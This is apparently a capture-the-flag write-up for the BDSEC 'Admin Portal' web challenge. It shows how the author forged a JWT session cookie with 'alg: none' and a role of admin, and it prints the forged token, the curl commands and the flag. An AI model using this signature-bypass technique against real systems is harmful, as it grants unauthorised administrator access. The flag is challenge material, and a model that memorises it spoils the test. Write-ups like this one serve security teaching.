# Admin Portal — BDSEC CTF Writeup

**Category:** Web
**Difficulty:** Easy / Intermediate
Flag: `bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}`

## The vibe

So the challenge drops us on some sketchy little Flask app at `66.228.54.80:8989`. Only guest accounts, but there's an admin panel taunting us from the nav bar. Classic "you can look but you can't touch" setup. Let's touch it.

## Poking around

Started by looking at a HAR capture of someone browsing the site — homepage, a login, a dashboard, and a failed `/admin` hit (403). No cookies showing up anywhere in that capture, which was a little suspicious, but turned out to just be a quirk of the capture, not the app.

Ran the actual login myself:

```bash
curl -c cookies.txt -b cookies.txt -d "username=guest" http://66.228.54.80:8989/login -L -v
```

And there it was — a `session` cookie, set right after logging in as `guest`. No password needed, just vibes and a username.

## Cracking open the cookie

The session cookie _looked_ like a JWT (three base64 chunks separated by dots), so I decoded it:

```json
// header
{"alg":"HS256","typ":"JWT"}

// payload
{"user":"guest","role":"user"}
```

There it is — `"role":"user"`. Somewhere on the server, something is presumably checking `role == "admin"` before letting you into `/admin`. If only we could just... change that.

Normally you can't, because HS256 tokens are signed and the server checks the signature. But this looked like a homemade JWT implementation rather than something battle-tested, so it felt worth trying the oldest trick in the JWT book.

## The `alg: none` trick

JWTs let the token itself declare which algorithm was used to sign it. Some sloppy implementations trust that field blindly — so if you set `alg` to `none`, the server just... skips checking the signature entirely. No secret key needed, no cracking required. You just ask nicely and it believes you.

Forged a new token:

```json
// header
{"alg":"none","typ":"JWT"}

// payload
{"user":"guest","role":"admin"}
```

Base64url-encoded each part, joined them with dots, left the signature section empty (with a trailing dot):

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.
```

Swapped that in as the `session` cookie and sent it over:

```bash
curl -H "Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ." http://66.228.54.80:8989/admin
```

And boom:

> Access granted. Welcome, administrator **guest**. `bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}`

## Takeaway

If your JWT library lets the token pick its own algorithm without pinning it server-side, you don't actually have a signed token — you have a suggestion. Always hardcode the expected `alg` on the verifying side and reject anything else outright.
